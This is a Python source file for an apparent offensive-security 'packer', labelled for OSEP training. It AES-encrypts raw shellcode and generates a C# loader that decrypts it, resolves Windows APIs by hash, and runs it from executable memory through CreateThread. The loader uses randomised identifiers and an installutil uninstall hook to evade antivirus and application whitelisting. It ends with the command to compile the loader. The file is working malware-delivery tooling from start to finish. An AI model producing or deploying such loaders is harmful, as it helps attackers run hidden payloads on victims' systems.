# -*- coding: utf-8 -*-
# Author                    : MochaByte
# Date created              : 18.06.2025


import os
import random, string

from Crypto.Cipher import AES
from importlib import resources
from argparse import ArgumentParser
from Crypto.Util.Padding import pad

from Utility.utils import Colors, banner

TEMPLATE = r'''
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ComponentModel;
using System.Configuration.Install; 

namespace OSEPLoader
{

    // ── WIN32 Structs ────────────────────────────────────────────
    [StructLayout(LayoutKind.Sequential)]
    internal unsafe struct IMAGE_DOS_HEADER
    {
        public ushort e_magic, e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc,
                    e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc,
                    e_ovno;
        public fixed ushort e_res[4];
        public ushort e_oemid, e_oeminfo;
        public fixed ushort e_res2[10];
        public int    e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct IMAGE_FILE_HEADER
    {
        public ushort Machine, NumberOfSections;
        public uint   TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public ushort SizeOfOptionalHeader, Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal unsafe struct IMAGE_OPTIONAL_HEADER64
    {
        public fixed byte _pad[112];          // up to DataDirectory[0]
        public IMAGE_DATA_DIRECTORY ExportTable;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal unsafe struct IMAGE_NT_HEADERS64
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct IMAGE_EXPORT_DIRECTORY
    {
        public uint Characteristics, TimeDateStamp;
        public ushort MajorVersion, MinorVersion;
        public uint Name, Base, NumberOfFunctions, NumberOfNames;
        public uint AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals;
    }

    internal class #-CLASS-#
    {

        private static void Main() => Run();

        // ── Win32 delegates ──────────────────────────────────────────────
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr #-VA_DELEG-#(
            IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool #-VP_DELEG-#(
            IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr #-CT_DELEG-#(
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint #-WF_DELEG-#(IntPtr hHandle, uint dwMilliseconds);

        // ── P/Invoke helpers to load addresses at runtime ────────────────
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        private static T #-GETAPI-#<T>(string dll, string func) where T : Delegate
        {
            IntPtr hModule = GetModuleHandle(dll) == IntPtr.Zero
                ? LoadLibrary(dll)             
                : GetModuleHandle(dll);

            IntPtr addr = GetProcAddress(hModule, func);
            return (T)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        // ── AES-128-CBC decrypt (PKCS7) ──────────────────────────────────
        private static byte[] #-DECRYPT-#(byte[] enc, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())           
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var dec = aes.CreateDecryptor())
                {
                    return dec.TransformFinalBlock(enc, 0, enc.Length);
                }
            }

        }

        // ── Hash: decimal string of last ASCII digits ───────────────
        static long ApiHash(string s)
        {
            long h = 0;
            foreach (byte b in System.Text.Encoding.ASCII.GetBytes(s))
                h = h * 10 + (b % 10);       // keep last digit
            return h;
        }

        // ── Resolve by hash, follow one forwarder, verify RX ─────────
        static unsafe IntPtr ResolveByHash(string dll, long hash)
        {
            IntPtr mod = GetModuleHandle(dll);
            if (mod == IntPtr.Zero) mod = LoadLibrary(dll);

            byte* basePtr = (byte*)mod;
            var dos = (IMAGE_DOS_HEADER*)basePtr;
            var nt  = (IMAGE_NT_HEADERS64*)(basePtr + dos->e_lfanew);

            uint expRva  = nt->OptionalHeader.ExportTable.VirtualAddress;
            uint expSize = nt->OptionalHeader.ExportTable.Size;
            if (expRva == 0) return IntPtr.Zero;

            var expDir = (IMAGE_EXPORT_DIRECTORY*)(basePtr + expRva);
            uint* names   = (uint*)(basePtr + expDir->AddressOfNames);
            ushort* ords  = (ushort*)(basePtr + expDir->AddressOfNameOrdinals);
            uint* funcs   = (uint*)(basePtr + expDir->AddressOfFunctions);

            for (uint i = 0; i < expDir->NumberOfNames; i++)
            {
                string n = Marshal.PtrToStringAnsi((IntPtr)(basePtr + names[i]));
                if (ApiHash(n) != hash) continue;

                uint rva = funcs[ ords[i] ];
                bool forward = (rva >= expRva && rva < expRva + expSize);

                if (forward)        // e.g. "KERNELBASE.VirtualAlloc"
                {
                    string fwd = Marshal.PtrToStringAnsi((IntPtr)(basePtr + rva));
                    var p = fwd.Split('.');
                    return ResolveByHash(p[0] + ".dll", ApiHash(p[1]));   // one hop
                }
                return (IntPtr)(basePtr + rva);
            }
            return IntPtr.Zero;
        }

        
        // ── Main entry ───────────────────────────────────────────────────
        internal static void Run()
        {
            // ---------- KEY / IV / ENCRYPTED BLOB ------------------------
            byte[] #-KEY-# = { #-KEY_VALUE-# };
            byte[] #-IV-#  = { #-IV_VALUE-# };
            byte[] #-PAYLOAD-# = { #-PAYLOAD_VALUE-# };

            byte[] sc  = #-DECRYPT-#(#-PAYLOAD-#, #-KEY-#, #-IV-#);
            Console.WriteLine("[+] Decrypted {sc.Length} bytes");

            // ---------- Resolve APIs dynamically -------------------------
            var VirtualAlloc = ( #-VA_DELEG-# ) Marshal.GetDelegateForFunctionPointer(ResolveByHash("kernel32.dll", #-HASH_VA-#), typeof(#-VA_DELEG-#));
            var VirtualProtect = ( #-VP_DELEG-# ) Marshal.GetDelegateForFunctionPointer(ResolveByHash("kernel32.dll", #-HASH_VP-#), typeof(#-VP_DELEG-#));
            var CreateThread = ( #-CT_DELEG-# ) Marshal.GetDelegateForFunctionPointer(ResolveByHash("kernel32.dll", #-HASH_CT-#), typeof(#-CT_DELEG-#));
            var WaitForSingle = ( #-WF_DELEG-# ) Marshal.GetDelegateForFunctionPointer(ResolveByHash("kernel32.dll", #-HASH_WF-#), typeof(#-WF_DELEG-#));

            // ---------- Allocate & copy ----------------------------------
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000 /* MEM_COMMIT|RESERVE */, 0x40   /* PAGE_EXECUTE_READWRITE */);
            if (baseAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAlloc failed");
                return;
            }

            Marshal.Copy(sc, 0, baseAddr, sc.Length);

            // ---------- (optional) tighten permissions to RX -------------
            // uint old;
            // VirtualProtect(baseAddr, (uint)sc.Length, 0x20 /* PAGE_EXECUTE_READ */, out old);

            // ---------- Execute ------------------------------------------
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("[+] hThread = 0x{hThread.ToInt64():X}");
            WaitForSingle(hThread, 0xFFFFFFFF);
        }
    }

    [RunInstaller(true)]
    public class #-INST-# : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // executed when:  installutil /U loader.exe
            #-CLASS-#.Run();     // call your real payload
        }
    }
}
'''

# Generate a random KEY and IV
def GenerateKey(key_size: int) -> tuple:
    # Generate a 16-byte or 32-byte key for AES-128 or AES-256
    key = os.urandom(key_size)
    #print(key)
    # Generate a 16-byte IV (128 bits, which is the block size for AES)
    iv = os.urandom(AES.block_size)
    #print(iv)
    
    return key, iv

# AES-128 CBC encryption
def EncryptAES(shellcode: bytes) -> bytes:
    #print(Colors.light_blue("[INF] Encryption Technique:\tAES-128-CBC"))

    # Generate random key and IV
    key, iv = GenerateKey(16)

    # Formatting 
    hex_key = ''.join([f"0x{key.hex()[i:i+2]}, " for i in range(0, len(key.hex()), 2)]).strip(", ")
    hex_iv = ''.join([f"0x{iv.hex()[i:i+2]}, " for i in range(0, len(iv.hex()), 2)]).strip(", ")

    # Create AES cipher in CBC mode
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Pad the shellcode to be a multiple of 16 bytes (AES block size)
    padded_shellcode = pad(shellcode, AES.block_size)

    # Encrypt the padded shellcode
    enc_shellcode = cipher.encrypt(padded_shellcode)

    # Return the encrypted shellcode
    return enc_shellcode, hex_key, hex_iv

def poly_name(n, char_set="ABC", min_len=16, max_len=32):
    """Return *n* distinct low-entropy identifiers."""
    made = set()
    while len(made) < n:
        ch = random.choice(char_set)
        name = ch * random.randrange(min_len, max_len + 1)
        if name not in made:
            made.add(name)
    return list(made)    

def api_hash(name: str) -> int:
    h = 0
    for b in name.encode('ascii'):
        h = h * 10 + (b % 10)
    return h

def main():

    parser = ArgumentParser(description="Simple packer for OSEP :)")

    # Adding the arguments
    parser.add_argument("-p", "--payload", required=True, help="The shellcode as raw binary file.")

    # Parsing the arguments
    args = parser.parse_args()

    # Banner ofc !
    banner()

    if args.payload:

        print(Colors.light_blue("[INF] Reading the shellcode from the file..."))

        # Reading the shellcode from the file
        with open(args.payload, "rb") as file:
            raw_payload = file.read()


        print(Colors.light_blue("[INF] Encrypting the shellcode..."))
        # Encrypt the shellcode using AES-128 CBC
        enc_payload, key, iv = EncryptAES(raw_payload)

        print(Colors.light_blue("[INF] Generating the loader..."))
        
        # Converting the encrypted payload to a hex string for C# compatibility
        hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)

        # Replacing the placeholders in the template
        temp = TEMPLATE
        temp = temp.replace("#-KEY_VALUE-#", key)
        temp = temp.replace("#-IV_VALUE-#", iv)
        temp = temp.replace("#-PAYLOAD_VALUE-#", hex_payload)

        ids = poly_name(11)

        # Adding the polymorphic behavior
        names = {
            "KEY"      : ids[0],
            "IV"       : ids[1],
            "PAYLOAD"  : ids[2],
            "DECRYPT"  : ids[3],
            "VA_DELEG" : ids[4],
            "CT_DELEG" : ids[5],
            "VP_DELEG" : ids[6],
            "WF_DELEG" : ids[7],
            "GETAPI"   : ids[8],
            "CLASS"    : ids[9],
            "INST"     : ids[10]
        }

        # Replacing the polymorphic names in the template
        for tok, rep in names.items():
            temp = temp.replace(f"#-{tok}-#", rep)

        hash_tokens = {
            "HASH_VA": str(api_hash("VirtualAlloc")),
            "HASH_VP": str(api_hash("VirtualProtect")),
            "HASH_CT": str(api_hash("CreateThread")),
            "HASH_WF": str(api_hash("WaitForSingleObject")),
        }

        for tok, rep in hash_tokens.items():
            temp = temp.replace(f"#-{tok}-#", rep)

        with open("loader.cs", "w", encoding="utf-8") as loader_file:
            # Writing the modified template to a new file
            loader_file.write(temp)

        print(Colors.green("[+] Loader.cs generated successfully!"))
        print(Colors.light_yellow('[INF] Compile with this command: "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe" /platform:x64 /optimize /unsafe loader.cs'))

    # Parse the arguments
    args = parser.parse_args()

if __name__ == "__main__":
    main()